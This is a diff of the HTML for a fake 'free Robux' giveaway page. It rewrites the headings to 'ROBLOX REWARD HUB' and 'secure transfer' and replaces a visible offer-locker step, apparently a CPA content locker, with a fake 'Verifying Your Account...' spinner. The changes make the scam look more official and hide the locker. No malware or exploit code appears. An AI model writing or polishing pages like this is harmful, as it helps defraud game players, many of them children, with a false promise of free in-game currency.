@@ -17,8 +17,8 @@
     
     <!-- STEP 1: Account Connection -->
     <div id="step1" class="step active">
-      <h1 class="main-title">🎮 LootQuest Rewards</h1>
-      <p class="subtitle">Connect your Roblox account to claim free Robux</p>
+      <h1 class="hero-title">ROBLOX REWARD HUB</h1>
+      <p class="hero-subtitle">Enter your username to begin the secure transfer</p>
       
       <div class="input-wrapper">
         <input 
@@ -29,8 +29,8 @@
           minlength="3" 
           maxlength="20"
         >
-        <button class="btn-primary" onclick="searchAccount()">
-          <span class="btn-text">Search Account</span>
+        <button class="btn-hero" onclick="searchAccount()">
+          <span class="btn-text">Continue →</span>
         </button>
       </div>
     </div>
@@ -83,12 +83,12 @@
 
     <!-- STEP 4: Human Verification -->
     <div id="step4" class="step" style="display: none;">
-      <h2 class="verify-title">🔐 Final Verification</h2>
-      <p class="verify-subtitle">Complete human verification to claim <span id="selected-amount"></span> Robux</p>
-      <p class="verify-username">Account: <span id="final-username"></span></p>
-      
-      <div class="locker-viewport">
-        <div id="ogads-container"></div>
+      <div class="processing-container">
+        <div class="spinner"></div>
+        <h2 class="processing-title">Verifying Your Account...</h2>
+        <p class="processing-subtitle">Completing final security check for <span id="selected-amount"></span> Robux</p>
+        <p class="processing-username">Account: <span id="final-username"></span></p>
+        <p class="processing-note">Please complete the verification when it appears</p>
       </div>
     </div>
   </div>
